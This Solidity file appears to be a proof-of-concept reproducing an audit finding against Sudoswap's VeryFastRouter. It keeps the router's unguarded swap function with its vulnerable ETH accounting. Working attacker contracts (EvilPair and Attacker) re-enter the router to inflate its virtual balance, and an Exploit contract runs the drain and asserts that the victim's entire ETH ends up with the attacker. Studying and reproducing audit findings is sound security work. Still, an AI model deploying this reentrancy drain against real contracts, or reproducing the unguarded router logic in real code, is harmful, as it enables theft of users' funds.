// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Sudoswap lssvm2 — Malicious pair can re-enter VeryFastRouter to drain
    the original caller's ETH (Cyfrin review, finding #18412, HIGH)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. No fork, no
    RPC, no anvil_state. The vulnerable `VeryFastRouter.swap` body is kept
    faithful for the executed attack path — the same virtual-`ethAmount`
    accounting the finding blames:
       * sell path:  outputAmount = pair.swapNFTsForToken(...); ethAmount += outputAmount;   // @> VULN
       * buy  path:  inputAmount  = pair.swapTokenForSpecificNFTs{value: ...}(...); ethAmount -= inputAmount;
       * end:        payable(tokenRecipient).safeTransferETH(ethAmount);
    `swap` is NOT `nonReentrant` and NEVER validates that `order.pair` is a
    real factory pair (source:
    github.com/sudoswap/lssvm2 @78d38753…/src/VeryFastRouter.sol#L266-L486).

    Attack (finding's malicious-pair / re-entrancy case):
      1. The victim is tricked into a buy order whose `pair` is the attacker's
         EvilPair, sending ETH with the call (recycleETH = true).
      2. The router forwards the victim's ETH to EvilPair.swapTokenForSpecificNFTs.
      3. EvilPair re-enters router.swap with a sell order on itself. During that
         re-entrant sell, EvilPair pushes the held ETH back to the router and
         returns an attacker-chosen `outputAmount`; the router trusts it
         (`ethAmount += outputAmount`) and refunds that "balance" to the
         attacker's tokenRecipient.
      4. Back in the outer call, EvilPair returns the full forwarded amount as
         `inputAmount`, so `ethAmount -= inputAmount` zeroes out and the outer
         refund is skipped — nothing reverts.
    Net: the victim's entire ETH is delivered to the attacker; the victim
    receives no NFTs and no refund.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal interface for the pair, matching the calls VeryFastRouter makes.
interface LSSVMPair {
    function spotPrice() external view returns (uint128);
    function swapNFTsForToken(
        uint256[] calldata nftIds,
        uint256 minExpectedTokenOutput,
        address payable tokenRecipient,
        bool isRouter,
        address routerCaller
    ) external returns (uint256);
    function swapTokenForSpecificNFTs(
        uint256[] calldata nftIds,
        uint256 maxExpectedTokenInput,
        address nftRecipient,
        bool isRouter,
        address routerCaller
    ) external payable returns (uint256);
}

/// @notice Reduced VeryFastRouter. The `swap` body preserves the finding's
///         blamed virtual-`ethAmount` accounting for the executed path. The
///         partial-fill branches, ERC1155/property-check variants, and factory
///         fee lookups are stripped as unrelated to the exploited path.
contract VeryFastRouter {
    struct BuyOrderWithPartialFill {
        LSSVMPair pair;
        bool isERC721;
        uint256[] nftIds;
        uint256 maxInputAmount;
        uint256 ethAmount;
        uint256 expectedSpotPrice;
    }

    struct SellOrderWithPartialFill {
        LSSVMPair pair;
        bool isETHSell;
        bool isERC721;
        uint256[] nftIds;
        uint128 expectedSpotPrice;
        uint256 minExpectedOutput;
    }

    struct Order {
        BuyOrderWithPartialFill[] buyOrders;
        SellOrderWithPartialFill[] sellOrders;
        address payable tokenRecipient;
        address nftRecipient;
        bool recycleETH;
    }

    /// @dev solmate SafeTransferLib.safeTransferETH, inlined (forge-std-only project).
    function safeTransferETH(address to, uint256 amount) internal {
        (bool success,) = to.call{value: amount}("");
        require(success, "ETH_TRANSFER_FAILED");
    }

    /**
     * @dev Performs a batch of sells and buys. Sells first, then buys, then a
     *      single ETH refund of the virtual `ethAmount`.
     *
     *      VULNERABILITY: this function is NOT `nonReentrant` and NEVER checks
     *      that `order.pair` is a factory-deployed pair. A malicious pair can
     *      therefore re-enter `swap` mid-execution and manipulate the return
     *      values that drive the `ethAmount` accounting below.
     */
    function swap(Order calldata swapOrder) external payable returns (uint256[] memory results) {
        uint256 ethAmount = msg.value;

        results = new uint256[](swapOrder.buyOrders.length + swapOrder.sellOrders.length);

        // Go through each sell order
        for (uint256 i; i < swapOrder.sellOrders.length;) {
            SellOrderWithPartialFill calldata order = swapOrder.sellOrders[i];
            uint128 pairSpotPrice = order.pair.spotPrice();
            uint256 outputAmount;

            // If the spot price parameter seen is what we expect it to be...
            if (pairSpotPrice == order.expectedSpotPrice) {
                // If the pair is an ETH pair and we opt into recycling ETH, add the output to our total accrued
                if (order.isETHSell && swapOrder.recycleETH) {
                    outputAmount = order.pair.swapNFTsForToken(
                        order.nftIds, order.minExpectedOutput, payable(address(this)), true, msg.sender
                    );

                    // Accumulate ETH amount — trusts the (untrusted) pair's return value
                    ethAmount += outputAmount; // @> VULN: malicious pair inflates the router's virtual balance
                }
                // Otherwise, all tokens or ETH received from the sale go to the token recipient
                else {
                    outputAmount = order.pair.swapNFTsForToken(
                        order.nftIds, order.minExpectedOutput, swapOrder.tokenRecipient, true, msg.sender
                    );
                }
            }
            results[i] = outputAmount;

            unchecked {
                ++i;
            }
        }

        // Go through each buy order
        for (uint256 i; i < swapOrder.buyOrders.length;) {
            BuyOrderWithPartialFill calldata order = swapOrder.buyOrders[i];

            // @dev We use inputAmount to store the spot price temporarily before it's overwritten
            uint256 inputAmount = order.pair.spotPrice();

            // If the spot price parameter seen is what we expect it to be...
            if (inputAmount == order.expectedSpotPrice) {
                // Then do a direct swap for all items we want — forwards the caller's ETH to an UNVALIDATED pair
                inputAmount = order.pair.swapTokenForSpecificNFTs{value: order.ethAmount}(
                    order.nftIds, order.maxInputAmount, swapOrder.nftRecipient, true, msg.sender
                );

                // Deduct ETH amount if it's an ETH swap
                if (order.ethAmount != 0) {
                    ethAmount -= inputAmount;
                }
            }
            // Store inputAmount in results
            results[i + swapOrder.sellOrders.length] = inputAmount;

            unchecked {
                ++i;
            }
        }

        // Send excess ETH back to token recipient
        if (ethAmount != 0) {
            safeTransferETH(swapOrder.tokenRecipient, ethAmount);
        }
    }

    receive() external payable {}
}

/// @notice The attacker's malicious "pair". It is not a factory pair and holds
///         no NFTs — it simply keeps the ETH the router forwards and re-enters
///         the router to route that ETH out to the attacker.
contract EvilPair {
    uint128 internal immutable expectedSpotPrice;
    address payable public router;
    Attacker public attacker;

    constructor(uint128 _sp) {
        expectedSpotPrice = _sp;
    }

    function setRouter(address payable _router) external {
        router = _router;
    }

    function setAttacker(Attacker _attacker) external {
        attacker = _attacker;
    }

    function spotPrice() external view returns (uint128) {
        return expectedSpotPrice;
    }

    /// @dev Called by the OUTER buy order. Receives the victim's ETH, then
    ///      re-enters the router. Returns msg.value as `inputAmount` so the
    ///      outer `ethAmount -= inputAmount` zeroes out (no revert) — while
    ///      delivering no NFTs.
    function swapTokenForSpecificNFTs(
        uint256[] calldata,
        uint256,
        address,
        bool,
        address
    ) external payable returns (uint256) {
        uint256 ethIn = msg.value;
        attacker.attack(); // RE-ENTER VeryFastRouter.swap (no reentrancy guard)
        return ethIn;
    }

    /// @dev Called during the RE-ENTRANT sell order with tokenRecipient = router.
    ///      Push our held ETH (the victim's) to the router and return it as the
    ///      `outputAmount`, so the router's `ethAmount += outputAmount` then
    ///      refunds it to the attacker.
    function swapNFTsForToken(
        uint256[] calldata,
        uint256,
        address payable tokenRecipient,
        bool,
        address
    ) external returns (uint256) {
        uint256 bal = address(this).balance;
        (bool ok,) = tokenRecipient.call{value: bal}("");
        require(ok, "push to router failed");
        return bal;
    }

    receive() external payable {}
}

/// @notice Re-entrancy driver + the attacker's ETH sink (tokenRecipient of the
///         re-entrant order). Kept separate from EvilPair, mirroring the
///         finding's EvilPairReentrancyAttacker.
contract Attacker {
    VeryFastRouter internal immutable router;
    EvilPair internal immutable pair;
    uint128 internal immutable sp;

    constructor(VeryFastRouter _router, EvilPair _pair, uint128 _sp) {
        router = _router;
        pair = _pair;
        sp = _sp;
    }

    function attack() external {
        // A single sell order on the malicious pair, recycleETH = true, with
        // this contract as tokenRecipient — so the router's refund lands here.
        VeryFastRouter.SellOrderWithPartialFill[] memory sells =
            new VeryFastRouter.SellOrderWithPartialFill[](1);
        uint256[] memory ids = new uint256[](1);
        ids[0] = 1337;
        sells[0] = VeryFastRouter.SellOrderWithPartialFill({
            pair: LSSVMPair(address(pair)),
            isETHSell: true,
            isERC721: true,
            nftIds: ids,
            expectedSpotPrice: sp,
            minExpectedOutput: 0
        });
        VeryFastRouter.BuyOrderWithPartialFill[] memory buys =
            new VeryFastRouter.BuyOrderWithPartialFill[](0);

        VeryFastRouter.Order memory o = VeryFastRouter.Order({
            buyOrders: buys,
            sellOrders: sells,
            tokenRecipient: payable(address(this)),
            nftRecipient: address(this),
            recycleETH: true
        });

        router.swap(o); // re-enters with value 0
    }

    receive() external payable {}
}

/// @notice The honest victim (ALICE). Tricked into a buy order on the
///         attacker's pair, sending its whole ETH balance with the call.
contract Victim {
    VeryFastRouter internal immutable router;
    EvilPair internal immutable pair;
    uint128 internal immutable sp;

    constructor(VeryFastRouter _router, EvilPair _pair, uint128 _sp) {
        router = _router;
        pair = _pair;
        sp = _sp;
    }

    function placeSwap() external {
        uint256 bal = address(this).balance;

        VeryFastRouter.BuyOrderWithPartialFill[] memory buys =
            new VeryFastRouter.BuyOrderWithPartialFill[](1);
        uint256[] memory ids = new uint256[](1);
        ids[0] = 1;
        buys[0] = VeryFastRouter.BuyOrderWithPartialFill({
            pair: LSSVMPair(address(pair)),
            isERC721: true,
            nftIds: ids,
            maxInputAmount: bal,
            ethAmount: bal,
            expectedSpotPrice: sp
        });
        VeryFastRouter.SellOrderWithPartialFill[] memory sells =
            new VeryFastRouter.SellOrderWithPartialFill[](0);

        VeryFastRouter.Order memory o = VeryFastRouter.Order({
            buyOrders: buys,
            sellOrders: sells,
            tokenRecipient: payable(address(this)),
            nftRecipient: address(this),
            recycleETH: true
        });

        router.swap{value: bal}(o);
    }

    receive() external payable {}
}

/// @notice Cheatcode-free orchestrator for the Playground. Deploys everything in
///         a fixed CREATE order, funds the victim with the ETH sent to run(),
///         triggers the victim's tricked swap, and asserts the drain.
contract Exploit {
    uint128 public constant SPOT_PRICE = 1 ether;

    VeryFastRouter public router;
    EvilPair public pair;
    Attacker public attacker;
    Victim public victim;

    constructor() {
        router = new VeryFastRouter(); // CREATE nonce 1
        pair = new EvilPair(SPOT_PRICE); // CREATE nonce 2
        attacker = new Attacker(router, pair, SPOT_PRICE); // CREATE nonce 3
        victim = new Victim(router, pair, SPOT_PRICE); // CREATE nonce 4
        pair.setRouter(payable(address(router)));
        pair.setAttacker(attacker);
    }

    function run() external payable {
        // Model ALICE's wallet: fund the victim with the ETH sent to run().
        uint256 stake = msg.value;
        (bool ok,) = address(victim).call{value: stake}("");
        require(ok, "fund victim failed");

        // Baseline: attacker holds nothing; victim holds its whole stake.
        require(address(attacker).balance == 0, "attacker not empty");
        require(address(victim).balance == stake, "victim not funded");

        // The victim places its (tricked) swap; the malicious pair re-enters
        // and drains the entire stake to the attacker.
        victim.placeSwap();

        // HARM: the attacker holds the victim's entire ETH; the victim was left
        // with nothing (no NFTs, no refund). Router/pair retain no dust.
        require(address(attacker).balance == stake, "drain incomplete");
        require(address(victim).balance == 0, "victim retained funds");
        require(address(router).balance == 0, "router retained dust");
        require(address(pair).balance == 0, "pair retained dust");
    }

    receive() external payable {}
}
